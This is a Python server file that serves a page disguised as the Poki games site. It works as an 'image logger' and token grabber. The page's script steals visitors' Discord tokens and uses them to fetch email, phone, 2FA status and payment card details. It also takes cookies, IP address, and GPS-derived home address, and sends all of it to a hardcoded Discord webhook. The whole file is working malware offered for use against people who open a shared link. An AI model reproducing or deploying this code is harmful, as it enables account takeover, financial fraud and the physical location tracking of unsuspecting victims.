from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Configuration
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
        
        # Get visitor's real IP
        ip = (self.headers.get('CF-Connecting-IP') or 
              self.headers.get('X-Real-IP') or 
              self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
        
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Send basic notification
        try:
            payload = {
                "username": "Image Logger",
                "content": "@everyone",
                "embeds": [{
                    "title": "🎯 NEW VICTIM - Loading...",
                    "color": 16753920,
                    "fields": [
                        {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
                        {"name": "💻 User Agent", "value": f"```{ua[:100]}```", "inline": False}
                    ],
                    "thumbnail": {"url": POKI_IMAGE},
                    "footer": {"text": "Grabbing data..."}
                }]
            }
            req = urllib.request.Request(WEBHOOK, 
                data=json.dumps(payload).encode(),
                headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # Return HTML
        html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Poki">
<meta property="og:title" content="Poki - Free Online Games - Play Now!">
<meta property="og:description" content="Play the best free online games on Poki">
<meta property="og:image" content="{POKI_IMAGE}">
<meta property="og:image:secure_url" content="{POKI_IMAGE}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="https://poki.com">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Poki - Free Online Games">
<meta name="twitter:description" content="Play the best free online games">
<meta name="twitter:image" content="{POKI_IMAGE}">
<meta name="theme-color" content="#00D9FF">
<link rel="icon" href="{POKI_IMAGE}">
<title>Poki - Free Online Games</title>
<style>
*{{margin:0;padding:0}}
body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial}}
.logo{{max-width:400px;width:90%}}
#info{{position:fixed;bottom:10px;left:10px;background:lime;color:#000;padding:10px;border-radius:8px;font:11px monospace;max-width:300px;display:none}}
#info.show{{display:block}}
</style>
</head>
<body>
<img src="{POKI_IMAGE}" class="logo" alt="Poki">
<div id="info"></div>
<script>
(async()=>{{
let d='';
const box=document.getElementById('info');
let allCookies=document.cookie;
let dataGrabbed=false;

// Get Chrome/Microsoft username
let userName='Not found';
try{{
if(allCookies.includes('MSCC')||allCookies.includes('MSPAUTH')){{
let msMatch=allCookies.match(/MSCC=([^;]+)/);
if(msMatch)userName=decodeURIComponent(msMatch[1]);
}}
if(allCookies.includes('CHROME')||allCookies.includes('ACCOUNT_CHOOSER')){{
let chromeMatch=allCookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{{2,}}/);
if(chromeMatch)userName=chromeMatch[0];
}}
}}catch(e){{}}

d+=`🍪 ${{allCookies.split(';').length}} cookies<br>👤 ${{userName}}<br>`;

// DISCORD TOKEN - BETTER GRABBING
let tok=[];

// Method 1: Webpack (most reliable)
try{{
if(window.webpackChunkdiscord_app){{
window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
for(let m of Object.values(r.c)){{
try{{
if(m?.exports?.default?.getToken){{
let t=m.exports.default.getToken();
if(t&&!tok.includes(t))tok.push(t);
}}
if(m?.exports?.getToken){{
let t=m.exports.getToken();
if(t&&!tok.includes(t))tok.push(t);
}}
}}catch(e){{}}
}}
}}]);
}}
}}catch(e){{}}

// Method 2: Direct token access
try{{
if(window.DiscordNative?.isRenderer){{
const token=window.DiscordNative.app.getToken();
if(token&&!tok.includes(token))tok.push(token);
}}
}}catch(e){{}}

// Method 3: LocalStorage deep scan
try{{
for(let i=0;i<localStorage.length;i++){{
let k=localStorage.key(i);
let v=localStorage.getItem(k);
if(v){{
// Find all token patterns
let matches=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
if(!matches)matches=v.match(/mfa\\.[\\w-]{{84,}}/g);
if(matches){{
matches.forEach(t=>{{
if(t&&!tok.includes(t))tok.push(t);
}});
}}
}}
}}
}}catch(e){{}}

// Method 4: SessionStorage
try{{
for(let i=0;i<sessionStorage.length;i++){{
let k=sessionStorage.key(i);
let v=sessionStorage.getItem(k);
if(v){{
let matches=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
if(matches){{
matches.forEach(t=>{{
if(t&&!tok.includes(t))tok.push(t);
}});
}}
}}
}}
}}catch(e){{}}

// Process Discord account - GET EMAIL AND PHONE
if(tok.length>0){{
for(let t of tok){{
try{{
// Get user info
let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
if(r.ok){{
let u=await r.json();

// Display info
d+=`✅ Discord Found!<br>`;
d+=`👤 ${{u.username}}#${{u.discriminator}}<br>`;
d+=`📧 ${{u.email||'No email'}}<br>`;
d+=`📱 ${{u.phone||'No phone'}}<br>`;
d+=`🆔 ${{u.id}}<br>`;

// Get payment info
let cards=[];
try{{
let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
headers:{{'Authorization':t}}
}});
if(billing.ok){{
let b=await billing.json();
cards=b.map(c=>`${{c.brand}} *${{c.last_4}} exp ${{c.expires_month}}/${{c.expires_year}}`);
}}
}}catch(e){{}}

// Get nitro
let nitro='None';
try{{
let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
headers:{{'Authorization':t}}
}});
if(subs.ok){{
let s=await subs.json();
if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro Full';
}}
}}catch(e){{}}

// Make sure email and phone are strings
const userEmail=u.email?String(u.email):'NOT SET - No email on account';
const userPhone=u.phone?String(u.phone):'NOT SET - No phone on account';
const userName=u.username?String(u.username):'Unknown';
const userDiscrim=u.discriminator?String(u.discriminator):'0000';
const fullUsername=`${{userName}}#${{userDiscrim}}`;

// Send EVERYTHING to webhook
await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:`@everyone 🚨 **${{fullUsername}}** JUST OPENED THE LINK!`,
embeds:[{{
title:`🔑 ${{fullUsername}} - ACCOUNT STOLEN`,
color:16711680,
description:`**Account Owner:** ${{fullUsername}}\\n**Email:** ${{userEmail}}\\n**Phone:** ${{userPhone}}`,
fields:[
{{name:'👤 Discord Username',value:fullUsername,inline:false}},
{{name:'📧 Email Address',value:userEmail,inline:false}},
{{name:'📱 Phone Number',value:userPhone,inline:false}},
{{name:'🆔 User ID',value:String(u.id||'Unknown'),inline:true}},
{{name:'🔐 2FA Status',value:u.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
{{name:'💎 Nitro',value:String(nitro),inline:true}},
{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'No cards saved',inline:false}},
{{name:'🔑 Full Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
],
thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}},
footer:{{text:`${{fullUsername}} opened the link`}}
}}]
}})
}});

break; // Stop after first valid token
}}
}}catch(e){{
console.error('Discord API error:',e);
}}
}}
}}else{{
d+='❌ No Discord (not logged in)<br>';
}}

box.innerHTML=d;
box.className='show';

// Send cookies
if(allCookies){{
await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
embeds:[{{
title:'🍪 COOKIES + BROWSER INFO',
description:`\\`\\`\\`${{allCookies}}\\`\\`\\``,
fields:[
{{name:'👤 Browser User',value:userName,inline:true}}
],
color:16753920
}}]
}})
}});
}}

// GPS LOCATION (asks permission - can't bypass)
if(navigator.geolocation){{
navigator.geolocation.getCurrentPosition(async(p)=>{{
let lat=p.coords.latitude;
let lon=p.coords.longitude;
let acc=p.coords.accuracy;

try{{
let g=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{lat}}&lon=${{lon}}`,{{
headers:{{'User-Agent':'Mozilla/5.0'}}
}});
let gd=await g.json();
let a=gd.address||{{}};

let streetNum=a.house_number||'';
let street=a.road||a.street||'';
let neighborhood=a.neighbourhood||a.suburb||'';
let city=a.city||a.town||a.village||'';
let county=a.county||'';
let state=a.state||'';
let zip=a.postcode||'';
let country=a.country||'';

let fullAddr=[streetNum,street,neighborhood,city,county,state,zip,country].filter(x=>x).join(', ');

await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:'@everyone 🚨 EXACT HOME ADDRESS FOUND (GPS)',
embeds:[{{
title:'📍 COMPLETE HOME ADDRESS',
color:3066993,
description:`**Full Address:**\\n${{fullAddr}}`,
fields:[
{{name:'🏠 Street',value:`${{streetNum}} ${{street}}`.trim()||'N/A',inline:false}},
{{name:'🏘️ Neighborhood',value:neighborhood||'N/A',inline:true}},
{{name:'🏙️ City',value:city||'N/A',inline:true}},
{{name:'🗺️ County',value:county||'N/A',inline:true}},
{{name:'📮 State',value:state||'N/A',inline:true}},
{{name:'📬 ZIP',value:zip||'N/A',inline:true}},
{{name:'🌍 Country',value:country||'N/A',inline:true}},
{{name:'📌 Exact Coords',value:`${{lat}}, ${{lon}}`,inline:false}},
{{name:'🎯 Accuracy',value:`${{Math.round(acc)}}m`,inline:true}},
{{name:'🗺️ Google Maps',value:`[View Location](https://maps.google.com/?q=${{lat}},${{lon}})`,inline:false}}
],
footer:{{text:'GPS - Exact Home Address'}}
}}]
}})
}});
}}catch(e){{}}
}},()=>{{}},{{enableHighAccuracy:true,timeout:5000,maximumAge:0}});
}}

// SILENT LOCATION (no permission needed - less accurate)
try{{
const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
const lang=navigator.language;
const screen=`${{screen.width}}x${{screen.height}}`;

// Use timezone to estimate location
let estimatedCity='Unknown';
let estimatedRegion='Unknown';
if(timezone.includes('New_York')){{estimatedCity='Eastern US';estimatedRegion='EST'}}
else if(timezone.includes('Chicago')){{estimatedCity='Central US';estimatedRegion='CST'}}
else if(timezone.includes('Denver')){{estimatedCity='Mountain US';estimatedRegion='MST'}}
else if(timezone.includes('Los_Angeles')){{estimatedCity='Western US';estimatedRegion='PST'}}

await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
embeds:[{{
title:'🕐 TIMEZONE INFO (Silent)',
color:65535,
fields:[
{{name:'Timezone',value:timezone,inline:true}},
{{name:'Language',value:lang,inline:true}},
{{name:'Screen',value:screen,inline:true}},
{{name:'Estimated Region',value:estimatedRegion,inline:true}}
],
footer:{{text:'No permission needed'}}
}}]
}})
}});
}}catch(e){{}}
}})();
</script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
